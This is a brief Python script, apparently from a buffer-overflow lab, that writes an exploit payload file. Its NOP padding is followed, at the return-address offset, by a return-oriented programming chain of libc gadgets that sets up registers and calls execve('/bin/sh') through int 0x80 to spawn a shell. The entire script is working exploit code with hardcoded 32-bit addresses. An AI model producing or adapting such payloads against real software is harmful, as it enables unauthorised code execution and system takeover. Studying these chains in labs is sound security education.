#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(500))

# The address of libc
libc_addr = 0xb7e08000

# The address of ld
ld_addr = 0xb7fdb000

# The address of the return address in memory
return_addr_location = 0xbfffe83c

# The address of buffer
buffer_addr = 0xbfffe6c2

# Calculate the offset between buffer address and address of return address
offset = return_addr_location - buffer_addr

# 0x000e8c12: mov edx, 0; cmovb eax, edx; ret;
gadgets1 = 0x000e8c12 + libc_addr

# 0x00077300: mov ecx, edx; rep stosb byte ptr es:[edi], al; pop edi; ret; 
gadgets2 = 0x00077300 + libc_addr

# 0x000a06e0: mov eax, 7; ret;
gadgets3 = 0x000a06e0 + libc_addr

# 0x0013fe9c: add eax, 4; ret;
gadgets4 = 0x0013fe9c + libc_addr

# 0x000183a5: pop ebx; ret;
gadgets5 = 0x000183a5 + libc_addr

# The address of bin/sh in libc
binsh_addr = 0xb7f63b2b

# 0x00002c87: int 0x80;
gadgets6 = 0x00002c87 + libc_addr

# dummy_num for pop
dummy_num = 0xffffffff

# Generate the payload
content[offset:offset+4] = (gadgets1).to_bytes(4,byteorder='little')
content[offset+4:offset+8] = (gadgets2).to_bytes(4,byteorder='little')
content[offset+8:offset+12] = (dummy_num).to_bytes(4,byteorder='little')
content[offset+12:offset+16] = (gadgets3).to_bytes(4,byteorder='little')
content[offset+16:offset+20] = (gadgets4).to_bytes(4,byteorder='little')
content[offset+20:offset+24] = (gadgets5).to_bytes(4,byteorder='little')
content[offset+24:offset+28] = (binsh_addr).to_bytes(4,byteorder='little')
content[offset+28:offset+32] = (gadgets6).to_bytes(4,byteorder='little')


# Write the content to chain_2
file = open("chain_2", "wb")
file.write(content)
file.close()
